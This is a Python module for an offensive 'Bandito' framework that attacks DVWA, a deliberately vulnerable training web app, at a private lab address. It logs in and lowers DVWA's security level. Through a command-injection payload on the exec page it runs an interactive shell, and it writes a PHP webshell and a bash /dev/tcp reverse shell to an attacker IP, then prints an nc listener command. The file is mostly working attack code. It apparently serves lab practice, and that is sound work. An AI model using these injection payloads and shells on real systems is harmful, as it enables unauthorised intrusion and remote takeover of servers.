import requests
import os
from datetime import datetime

class Tool:
    def __init__(self):
        self.name = "WebRCE"
        self.target = "http://192.168.107.129"
        self.user = "admin"
        self.password = "password"
        self.upload_path = "/srv/dvwa/hackable/uploads"
        self.session = None
        self.logged_in = False

    def show_options(self):
        print(colored("\nModule options (WebRCE):", "orange"))

        options = [
            ("RHOST", self.target, "yes", "Target IP address or URL"),
            ("USERNAME", self.user, "yes", "DVWA username"),
            ("PASSWORD", self.password, "yes", "DVWA password"),
            ("UPLOAD_PATH", self.upload_path, "yes", "Server-side upload path"),
        ]

        header = f"{'Name':<15} {'Current Setting':<30} {'Required':<10} {'Description'}"
        print(colored(header, "yellow"))
        print("-" * 80)

        for name, value, required, desc in options:
            print(f"{name:<15} {colored(value, 'green'):<30} {colored(required, 'red'):<10} {desc}")

    def show_help(self):
        print("\n=== WebRCE Tool ===")
        print(f"  Target: {self.target}")
        print("Commands:")
        print("  run                  - Login + set security to Low")
        print("  shell                - Interactive command shell (Part 1)")
        print("  upload_webshell      - Upload simple PHP webshell (Part 2)")
        print("  upload_revshell <ip> <port> - Upload reverse shell (Part 2)")
        print("  set target <url>     - Change target")
        print("  help                 - Show this help")
        print("  back / exit          - Return to framework\n")

    def handle_command(self, cmd_input):
        cmd = cmd_input.strip()
        low = cmd.lower()

        if low in ["help", "show options"]:
            self.show_help()
            return

        if low.startswith("set target"):
            value = cmd.split(maxsplit=2)[2].strip()
            if not value.startswith(("http://", "https://")):
                value = "http://" + value
            self.target = value.rstrip("/")
            print(f"[+] target → {self.target}")
            return

        if low in ["run", "exploit", "setup"]:
            self._login()
            return

        if not self.logged_in:
            print("[-] Not logged in. Type 'run' first.")
            return

        if low == "shell":
            self.interactive_shell()
            return

        if low == "upload_webshell":
            self.upload_webshell()
            return

        if low.startswith("upload_revshell"):
            parts = cmd.split()
            if len(parts) < 3:
                print("Usage: upload_revshell <your_ip> <port>")
                return
            self.upload_revshell(parts[1], parts[2])
            return

        if low in ["back", "exit", "quit"]:
            print("[*] Returning to Bandito framework...")
            return

        print(colored(f"[-] Unknown command: {cmd}", "red"))
        print("Type 'help' for available commands.")

    def _login(self):
        if self.logged_in:
            print("[+] Already logged in")
            return

        print(f"[*] Logging into {self.target}...")
        self.session = requests.Session()

        login_url = f"{self.target}/login.php"
        r_get = self.session.get(login_url)

        token_marker = "name='user_token' value='"
        token_pos = r_get.text.find(token_marker)
        user_token = ""
        if token_pos != -1:
            start = token_pos + len(token_marker)
            end = r_get.text.find("'", start)
            user_token = r_get.text[start:end]

        login_data = {
            "username": self.user,
            "password": self.password,
            "user_token": user_token,
            "Login": "Login"
        }
        r_login = self.session.post(login_url, data=login_data, allow_redirects=True)

        if "Logout" in r_login.text:
            print("[+] Login successful")
        else:
            print("[-] Login failed")
            return

        sec_url = f"{self.target}/security.php"
        self.session.post(sec_url, data={"security": "low", "seclev_submit": "Submit"})

        self.logged_in = True
        print("[+] Security level set to Low")
        self.show_help()

    def interactive_shell(self):
        print("\ndvwa> Interactive command shell (type 'exit' to return)\n")
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        while True:
            try:
                cmd = input("dvwa> ").strip()
                if cmd.lower() in ["exit", "back", "quit"]:
                    return
                if not cmd:
                    continue

                payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
                data = {"ip": payload, "Submit": "Submit"}

                r = self.session.post(vuln_url, data=data)

                if "<pre>" in r.text and "</pre>" in r.text:
                    output = r.text.split("<pre>")[1].split("</pre>")[0].strip()
                else:
                    output = r.text.strip()

                print(output if output else "[no output]")
                print("-" * 60)

            except KeyboardInterrupt:
                print("\n[*] Interrupted")
                return

    def upload_webshell(self):
        webshell = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
        safe = webshell.replace("'", "'\\''")

        cmd = f"echo '{safe}' > {self.upload_path}/shell.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        print("[+] Webshell uploaded")
        print(f"Test: {self.target}/hackable/uploads/shell.php?cmd=whoami")

    def upload_revshell(self, attacker_ip, port):
        rev = f'<?php system("bash -c \'bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1\' 2>&1"); ?>'
        safe = rev.replace("'", "'\\''").replace("\\", "\\\\")

        cmd = f"echo '{safe}' > {self.upload_path}/rev.php"
        payload = f"127.0.0.1 >/dev/null 2>&1; {cmd}"
        data = {"ip": payload, "Submit": "Submit"}
        vuln_url = f"{self.target}/vulnerabilities/exec/"

        self.session.post(vuln_url, data=data)

        trigger_url = f"{self.target}/hackable/uploads/rev.php"

        print("[+] Reverse shell uploaded")
        print(f"Trigger URL: {trigger_url}")
        print(f"Start listener: nc -lvnp {port}")
        print("Open the trigger URL in browser to catch shell")